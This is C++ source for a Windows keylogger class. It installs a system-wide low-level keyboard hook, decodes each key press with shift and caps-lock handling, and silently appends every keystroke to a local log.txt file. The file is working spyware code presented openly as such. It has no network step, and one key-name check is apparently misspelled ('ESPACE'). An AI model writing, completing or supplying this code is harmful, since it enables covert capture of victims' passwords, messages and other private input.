#include <Keylogger.hh>

static HHOOK keyHook;

Keylogger::Keylogger()
{
}

Keylogger::~Keylogger()
{
}

__declspec(dllexport) LRESULT CALLBACK handlekeys(int code, WPARAM wp, LPARAM lp)
{
	if (!(code == HC_ACTION && (wp == WM_SYSKEYDOWN || wp == WM_KEYDOWN)))
		return (CallNextHookEx(keyHook, code, wp, lp));

	static bool capslock = false;
	static bool shift = false;
	char tmp[0xFF] = { 0 };
	std::string str;
	DWORD msg = 1;
	KBDLLHOOKSTRUCT st_hook = *((KBDLLHOOKSTRUCT*)lp);
	bool printable;

	msg += (st_hook.scanCode << 16);
	msg += (st_hook.flags << 24);
	GetKeyNameText(msg, tmp, 0xFF);
	str = std::string(tmp);

	printable = (str.length() <= 1) ? true : false;

	if (!printable) 
	{
		if (str == "CAPSLOCK")
			capslock = !capslock;
		else if (str == "SHIFT")
			shift = true;
		if (str == "ENTER") 
		{
			str = "\n";
			printable = true;
		}
		else if (str == "ESPACE") 
		{
			str = " ";
			printable = true;
		}
		else if (str == "TAB") 
		{
			str = "\t";
			printable = true;
		}
		else 
		{
			str = ("[" + str + "]");
		}
	}

	if (printable) 
	{
		if (shift == capslock) 
		{ 
			for (size_t i = 0; i < str.length(); ++i)
				str[i] = tolower(str[i]);
		}
		else 
		{ 
			for (size_t i = 0; i < str.length(); ++i) 
			{
				if (str[i] >= 'A' && str[i] <= 'Z') 
				{
					str[i] = toupper(str[i]);
				}
			}
		}
			shift = false;
	}
	OutputDebugString(str.c_str());
	std::string path = "log.txt"; 
	std::ofstream outfile(path, std::ios::app);
	outfile << str;
	outfile.close();
	return CallNextHookEx(keyHook, code, wp, lp);
}

bool Keylogger::init()
{
	this->_moduleHandle = GetModuleHandle(NULL);
	keyHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)handlekeys, this->_moduleHandle, NULL);
	return (true);
}